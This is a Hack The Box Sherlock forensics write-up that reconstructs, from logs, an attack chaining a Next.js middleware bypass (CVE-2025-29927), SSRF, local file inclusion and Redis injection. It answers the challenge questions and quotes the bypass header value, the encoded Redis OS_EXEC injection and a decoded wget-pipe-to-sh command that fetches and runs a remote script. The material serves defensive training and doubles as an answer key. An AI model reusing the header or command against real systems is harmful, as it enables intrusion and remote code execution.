# HTB Sherlock - NeuroSync-D

![htb logo](./Images/htb_logo.png)

| Date          | Author          | Difficulty | Challenge Type |
| ------------- | --------------- | ---------- | -------------- |
| 2025-09-09 | Andrew McKenzie | Easy       | DFIR           |

---
## Description
This challenge involves a comprehensive log analysis of a multi-stage attack targeting a web application. By correlating events across several log files (web server, application, and database), the goal is to reconstruct the entire attack chain, from initial reconnaissance and exploitation of a Next.js vulnerability to lateral movement via SSRF and final RCE through Redis injection.
## Scenario
NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.
## Artifacts Provided
- NeuroSync-D.zip
	- NeuroSync.zip
		- access.log
		- bci-device.log
		- data-api.log
		- interface.log
		- redis.log

| Filename       | Algorithm | Hash                                                             |
| -------------- | --------- | ---------------------------------------------------------------- |
| access.log     | SHA256    | 2b9d31b6e14e446806e229045a137ab4260c1e260004f0b817b893356daea929 |
| access.log     | SHA1      | b2e62fda9622c2fb931f1ec51100909fa50565ce                         |
| access.log     | MD5       | a966c510aa23a85dfb2073c504de03d5                                 |
| bci-device.log | SHA256    | 53d9f549747853c6fcf2c1f11e22676a97bcdf966718d4d7ada76b33d6702940 |
| bci-device.log | SHA1      | f708d9ab3e60931f242d21e5f7ae73609ab1c1f1                         |
| bci-device.log | MD5       | d4a20bbe1658cf5f75dd8d85fb75bc26                                 |
| data-api.log   | SHA256    | 9bfd9c99e1bffbb59e1970264f0e8aa8e368f499a8c3d9bdfa5e93e1d3d4f8ab |
| data-api.log   | SHA1      | 259172990cc0db216992e554ae839c06ef4f6f76                         |
| data-api.log   | MD5       | c52f3919005a91bf3c152e68d5f348c4                                 |
| interface.log  | SHA256    | b880a0f7ece9ecf7792d66183feb70b88d887920f1712c7d1fc8b85409466254 |
| interface.log  | SHA1      | 0a17bdb7f9ba81daabca4538e46072e9bb93346e                         |
| interface.log  | MD5       | a52235ea06cc823ed671cdb311f4b2d1                                 |
| redis.log      | SHA256    | 66f97589a74e3a9ac237ef8668da975b0af6255ac8790288097c2fe4afa752f7 |
| redis.log      | SHA1      | 09fb294a5d8b588b48928a789f2caee6a3400785                         |
| redis.log      | MD5       | 16af67ac6fda9451efe7ff82f947fbe6                                 |
## Skills Learned
- **Multi-Source Log Correlation:** Analyzing and connecting events across different log files (NGINX, Next.js, Redis) to build a comprehensive attack timeline.
- **N-Day Vulnerability Identification:** Using application version information and OSINT to identify a known vulnerability (**CVE-2025-29927**).
- **Exploit Chain Analysis:** Deconstructing a complex attack involving a middleware bypass, Server-Side Request Forgery (**SSRF**), Local File Inclusion (**LFI**), and Redis command injection.
- **Payload Decoding:** Using tools like CyberChef to decode Base64-encoded commands and uncover the final payload.
- **Command-Line Log Analysis:** Utilizing tools like `grep` and `wc` for efficient searching and counting within log files.
## Initial Analysis
The investigation followed a step-by-step reconstruction of the attacker's activities by correlating data from the provided log files.
1. **Reconnaissance & Initial Exploit:** The `interface.log` first established that the application was running **Next.js v15.1.0**. This version was identified as vulnerable to **CVE-2025-29927**, a middleware bypass flaw. The `access.log` showed the attacker fingerprinting the application and then repeatedly probing the `/api/bci/analytics` endpoint. After five unauthorized attempts, a successful `200 OK` response at **11:38:05** confirmed the bypass was successful, likely by manipulating the `x-middleware-subrequest` header.
2. **Lateral Movement via SSRF:** The attacker chained the bypass with a Server-Side Request Forgery (SSRF) vulnerability. The `data-api.log` revealed an internal port scan originating from `127.0.0.1`, which discovered an internal API running on port **`4000`**.
3. **LFI and Information Gathering:** Now targeting the internal API, the attacker brute-forced endpoints and found a `/logs` endpoint vulnerable to **Local File Inclusion (LFI)**, confirmed by path traversal patterns in the logs. The first malicious use of this LFI occurred at **11:39:01**. The attacker leveraged this to read sensitive system files, ultimately exfiltrating a file named `secret.key`.
4. **RCE via Redis Injection:** The final stage of the attack is visible in `redis.log`. Using the information gathered from the LFI, the attacker crafted a malicious command and injected it into the Redis server via the `OS_EXEC` function. The command contained a Base64-encoded payload.
5. **Payload Execution:** Decoding the payload revealed the final command: **`wget http://185.202.2.147/h4P1n4/run.sh -O- | sh`**. This command downloads and executes a remote script, confirming that the attacker achieved Remote Code Execution on the server.
## Questions:
1. **What version of Next.js is the application using?**
Reviewing the logs, we eventually find that `interface.log` contains the information we are looking for for this question. The version of Next.js being used is `15.1.0`.

![image one](./Images/Pasted%20image%2020250909153451.png)

2. **What local port is the Next.js-based application running on?**
Directly below the version information, we can see that locally the server is running on port `3000`.

![image two](./Images/Pasted%20image%2020250909153536.png)

3. **A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?**
We can review searchsploit for any exploits for Next.js. To which there is a result, and its version is relatively close to ours. Mirroring the information locally, we see that there is a date of 2025-03-06, which coincides with the question, as well as a CVE, which is the answer `CVE-2025-29927`.

![image three](./Images/Pasted%20image%2020250909153851.png)
![image four](./Images/Pasted%20image%2020250909153907.png)

4. **The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?**
Reviewing the access logs, we can see the first 200 message within the `/_next/` directory was `main-app.js`.

![image five](./Images/Pasted%20image%2020250909154032.png)

5. **Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?**
Directly below the information-gathering requests, we can see requests, in mass, to `/api/bci/analytics`.

![image six](./Images/Pasted%20image%2020250909154117.png)

6. **How many requests to this endpoint have resulted in an "Unauthorized" response?**
We can do a quick command to get this information, `cat access.log | grep "401" | uniq | wc -l`, which returns `5`.

![image seven](./Images/Pasted%20image%2020250909154223.png)

7. **When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?**
The first successful attempt against this endpoint is when the server returned 200, which is at `2025-04-01 11:38:05`.

![image eight](./Images/Pasted%20image%2020250909154439.png)

8. **Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?**
From within the interface logs, we can see a header being incremented by one string, then eventually a 200 is returned. We can safely assume the header's value was incremented again from the last failure in the logs, becoming `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`.

![image nine](./Images/Pasted%20image%2020250909155219.png)

9. **The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?**
We can see that the data-api logs indicate that port `4000` is utilized there, and we also see communication to the local host.

![image ten](./Images/Pasted%20image%2020250909155529.png)

10. **After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?**
Further down in the logs, we can see that the vulnerable API is `/logs`, as we can see signs of path traversal looking for file inclusion vulnerabilities.

![image eleven](./Images/Pasted%20image%2020250909155706.png)

11. **When the vulnerable endpoint found was used maliciously for the first time?**
The first malicious request to this endpoint was logged at `2025-04-01 11:39:01`.

![image twelve](./Images/Pasted%20image%2020250909155815.png)

12. **What is the attack name the endpoint is vulnerable to?**
As mentioned in the answer for question 10, the attack is called `local file inclusion`. 

13. **What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?**
The last filename that was exploited using this tactic was `secret.key`. 

![image thirteen](./Images/Pasted%20image%2020250909160004.png)

14. **Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?**
Reviewing the Redis logs, we can see at the end a long encoded string being passed to `OS_EXEC`. The full line is `OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb`.

![image fourteen](./Images/Pasted%20image%2020250909160115.png)

15. **Once decoded, what is the command?**
This string can be decoded using CyberChef; the majority of it was Base64, however there are some remnants that won't decode. The final command that can be seen is `wget http://185.202.2.147/h4P1n4/run.sh -O- | sh`.

![image fifteen](./Images/Pasted%20image%2020250909160348.png)